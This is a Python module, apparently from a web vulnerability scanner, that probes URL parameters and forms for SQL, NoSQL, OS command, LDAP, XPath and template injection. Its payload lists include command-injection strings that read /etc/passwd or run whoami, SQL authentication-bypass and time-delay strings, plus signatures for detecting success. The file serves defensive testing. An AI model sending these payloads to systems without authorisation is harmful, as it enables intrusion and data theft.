"""OWASP A03: Injection - Production Grade Scanner.

Detects:
- SQL Injection (Error-based, Boolean-based, Time-based)
- NoSQL Injection (MongoDB, CouchDB)
- Command Injection (OS Command)
- LDAP Injection
- XPath Injection
- Template Injection (SSTI)
"""

import asyncio
import re
import time
from typing import List, Dict
from urllib.parse import urlparse, parse_qs
from loguru import logger


class InjectionScanner:
    """Advanced injection vulnerability scanner."""

    def __init__(self, async_scanner, config: Dict = None):
        self.scanner = async_scanner
        self.config = config or {}
        self.results = []

    async def scan(self, target: str, recon_data: Dict = None) -> List[Dict]:
        """Comprehensive injection scan.
        
        Args:
            target: Target URL
            recon_data: Reconnaissance data (forms, parameters)
            
        Returns:
            List of vulnerability findings
        """
        logger.info("[A03] Starting Injection scan")
        
        # Get test targets
        urls = self._get_test_urls(target, recon_data)
        forms = self._get_forms(recon_data)
        
        await asyncio.gather(
            self._test_sql_injection(urls),
            self._test_nosql_injection(urls),
            self._test_command_injection(urls),
            self._test_ldap_injection(urls),
            self._test_xpath_injection(urls),
            self._test_template_injection(urls),
            self._test_form_injections(forms)
        )
        
        logger.success(f"[A03] Scan complete: {len(self.results)} vulnerabilities found")
        return self.results

    def _get_test_urls(self, target: str, recon_data: Dict = None) -> List[str]:
        """Get URLs with parameters to test."""
        urls = [target]
        if recon_data and 'urls' in recon_data:
            urls.extend([u for u in recon_data['urls'] if '?' in u][:50])
        return urls

    def _get_forms(self, recon_data: Dict = None) -> List[Dict]:
        """Get forms from recon data."""
        if recon_data and 'forms' in recon_data:
            return recon_data['forms'][:20]
        return []

    async def _test_sql_injection(self, urls: List[str]):
        """Test for SQL injection vulnerabilities."""
        logger.info("[A03:SQLi] Testing for SQL injection")
        
        # SQL injection payloads
        sqli_payloads = {
            # Error-based
            'error': [
                "'",
                '"',
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' OR 1=1--",
                '" OR 1=1--',
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='2"
            ],
            # Boolean-based
            'boolean': [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1 AND 1=1",
                "1 AND 1=2"
            ],
            # Time-based
            'time': [
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR pg_sleep(5)--",
                "1' AND SLEEP(5)--"
            ]
        }
        
        # SQL error signatures
        error_signatures = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"Unknown column.*?in.*?field list",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
            r"Pdo[./_\\]Mysql",
            r"MySqlException",
            r"SQLSTATE\[\d+\]",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s\ssyntax error at or near",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark after the character string",
            r"SQL Server.*?Driver",
            r"Warning.*?mssql_",
            r"Driver.*?SQL[\s_-]?Server",
            r"OLE DB.*?SQL Server",
            r"SQLServer JDBC Driver",
            r"Incorrect syntax near",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?\Woci_",
            r"Warning.*?\Wora_"
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                continue
            
            # Test error-based SQLi
            for param in params:
                original_response = await self.scanner.fetch(url)
                if not original_response:
                    continue
                
                for payload in sqli_payloads['error']:
                    test_url = self._inject_payload(url, param, payload)
                    test_response = await self.scanner.fetch(test_url)
                    
                    if test_response and test_response['status'] in [200, 500]:
                        for signature in error_signatures:
                            if re.search(signature, test_response['content'], re.IGNORECASE):
                                self.results.append({
                                    'type': 'SQL Injection (Error-based)',
                                    'url': test_url,
                                    'parameter': param,
                                    'severity': 'critical',
                                    'evidence': f"SQL error detected with payload: {payload}",
                                    'confidence': 0.95,
                                    'cvss_score': 9.8,
                                    'payload': payload,
                                    'remediation': 'Use parameterized queries/prepared statements'
                                })
                                logger.critical(f"[SQLi] Error-based SQLi found: {param}={payload}")
                                break
                
                # Test time-based SQLi
                for payload in sqli_payloads['time']:
                    test_url = self._inject_payload(url, param, payload)
                    
                    start_time = time.time()
                    test_response = await self.scanner.fetch(test_url)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 4.5:  # 5 second delay minus tolerance
                        self.results.append({
                            'type': 'SQL Injection (Time-based)',
                            'url': test_url,
                            'parameter': param,
                            'severity': 'critical',
                            'evidence': f"Time delay detected: {elapsed:.2f}s with payload: {payload}",
                            'confidence': 0.90,
                            'cvss_score': 9.8,
                            'payload': payload,
                            'remediation': 'Use parameterized queries/prepared statements'
                        })
                        logger.critical(f"[SQLi] Time-based SQLi found: {param}={payload}")
                        break

    async def _test_nosql_injection(self, urls: List[str]):
        """Test for NoSQL injection (MongoDB, etc.)."""
        logger.info("[A03:NoSQLi] Testing for NoSQL injection")
        
        nosql_payloads = [
            '{"$gt":""}',
            '{"$ne":null}',
            '{"$where":"this.password.length>0"}',
            'admin\' || \'1\'==\'1',
            '{"username":{"$regex":".*"}}',
            '{"$or":[{},{}]}'
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in nosql_payloads:
                    test_url = self._inject_payload(url, param, payload)
                    response = await self.scanner.fetch(test_url)
                    
                    if response and response['status'] == 200:
                        # Check for NoSQL errors or unexpected behavior
                        if any(err in response['content'].lower() for err in 
                               ['mongodb', 'nosql', 'mongoose', 'cannot convert']):
                            self.results.append({
                                'type': 'NoSQL Injection',
                                'url': test_url,
                                'parameter': param,
                                'severity': 'critical',
                                'evidence': f"NoSQL injection possible with payload: {payload}",
                                'confidence': 0.75,
                                'cvss_score': 8.6,
                                'payload': payload,
                                'remediation': 'Validate and sanitize all input, use schema validation'
                            })
                            logger.critical(f"[NoSQLi] NoSQL injection found: {param}")

    async def _test_command_injection(self, urls: List[str]):
        """Test for OS command injection."""
        logger.info("[A03:CMDi] Testing for command injection")
        
        cmd_payloads = [
            '; ls -la',
            '| ls -la',
            '& dir',
            '&& dir',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; whoami',
            '`whoami`',
            '$(whoami)',
            '; ping -c 5 127.0.0.1',
            '| ping -c 5 127.0.0.1'
        ]
        
        # Command execution indicators
        cmd_indicators = [
            r'root:x:0:0',
            r'bin/bash',
            r'bin/sh',
            r'total \d+',
            r'drwxr-xr-x',
            r'volume serial number',
            r'directory of',
            r'bytes free'
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in cmd_payloads:
                    test_url = self._inject_payload(url, param, payload)
                    response = await self.scanner.fetch(test_url)
                    
                    if response and response['status'] == 200:
                        for indicator in cmd_indicators:
                            if re.search(indicator, response['content'], re.IGNORECASE):
                                self.results.append({
                                    'type': 'Command Injection',
                                    'url': test_url,
                                    'parameter': param,
                                    'severity': 'critical',
                                    'evidence': f"Command execution detected with payload: {payload}",
                                    'confidence': 0.90,
                                    'cvss_score': 9.8,
                                    'payload': payload,
                                    'remediation': 'Avoid system calls, use whitelist validation, escape shell metacharacters'
                                })
                                logger.critical(f"[CMDi] Command injection found: {param}={payload}")
                                break

    async def _test_ldap_injection(self, urls: List[str]):
        """Test for LDAP injection."""
        logger.info("[A03:LDAPi] Testing for LDAP injection")
        
        ldap_payloads = [
            '*',
            '*)(&',
            '*)(uid=*))(|(uid=*',
            'admin)(&)',
            '*)((|userPassword=*'
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in ldap_payloads:
                    test_url = self._inject_payload(url, param, payload)
                    response = await self.scanner.fetch(test_url)
                    
                    if response and 'ldap' in response['content'].lower():
                        self.results.append({
                            'type': 'LDAP Injection',
                            'url': test_url,
                            'parameter': param,
                            'severity': 'high',
                            'evidence': f"LDAP injection possible with payload: {payload}",
                            'confidence': 0.70,
                            'cvss_score': 7.5,
                            'payload': payload,
                            'remediation': 'Use parameterized LDAP queries and input validation'
                        })
                        logger.warning(f"[LDAPi] LDAP injection found: {param}")

    async def _test_xpath_injection(self, urls: List[str]):
        """Test for XPath injection."""
        logger.info("[A03:XPath] Testing for XPath injection")
        
        xpath_payloads = [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "' or count(/*)=1 or ''='"
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in xpath_payloads:
                    test_url = self._inject_payload(url, param, payload)
                    response = await self.scanner.fetch(test_url)
                    
                    if response and any(err in response['content'].lower() for err in 
                                       ['xpath', 'xml', 'syntax error']):
                        self.results.append({
                            'type': 'XPath Injection',
                            'url': test_url,
                            'parameter': param,
                            'severity': 'high',
                            'evidence': f"XPath injection possible with payload: {payload}",
                            'confidence': 0.70,
                            'cvss_score': 7.5,
                            'payload': payload,
                            'remediation': 'Use parameterized XPath queries'
                        })
                        logger.warning(f"[XPath] XPath injection found: {param}")

    async def _test_template_injection(self, urls: List[str]):
        """Test for Server-Side Template Injection (SSTI)."""
        logger.info("[A03:SSTI] Testing for template injection")
        
        ssti_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '{{7*\'7\'}}',
            '#{7*7}'
        ]
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in ssti_payloads:
                    test_url = self._inject_payload(url, param, payload)
                    response = await self.scanner.fetch(test_url)
                    
                    if response and '49' in response['content']:
                        self.results.append({
                            'type': 'Server-Side Template Injection',
                            'url': test_url,
                            'parameter': param,
                            'severity': 'critical',
                            'evidence': f"SSTI detected with payload: {payload} (output: 49)",
                            'confidence': 0.85,
                            'cvss_score': 9.0,
                            'payload': payload,
                            'remediation': 'Avoid user input in templates, use sandboxed template engines'
                        })
                        logger.critical(f"[SSTI] Template injection found: {param}")

    async def _test_form_injections(self, forms: List[Dict]):
        """Test forms for injection vulnerabilities."""
        logger.info("[A03:Forms] Testing forms for injection")
        
        for form in forms[:10]:  # Limit forms
            url = form.get('action', '')
            method = form.get('method', 'GET')
            fields = form.get('fields', [])
            
            if not url or not fields:
                continue
            
            # Test SQL injection in forms
            test_data = {}
            for field in fields:
                field_name = field.get('name', '')
                if field_name:
                    test_data[field_name] = "' OR '1'='1' --"
            
            if method.upper() == 'POST':
                response = await self.scanner.post(url, data=test_data)
            else:
                response = await self.scanner.fetch(url + '?' + '&'.join([f"{k}={v}" for k, v in test_data.items()]))
            
            if response and any(err in response['content'] for err in 
                               ['sql', 'mysql', 'syntax', 'database']):
                self.results.append({
                    'type': 'SQL Injection in Form',
                    'url': url,
                    'severity': 'critical',
                    'evidence': 'Form vulnerable to SQL injection',
                    'confidence': 0.75,
                    'cvss_score': 9.8,
                    'remediation': 'Use parameterized queries for all form inputs'
                })
                logger.critical(f"[SQLi] Form injection found at {url}")

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        from urllib.parse import urlencode, urlunparse
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))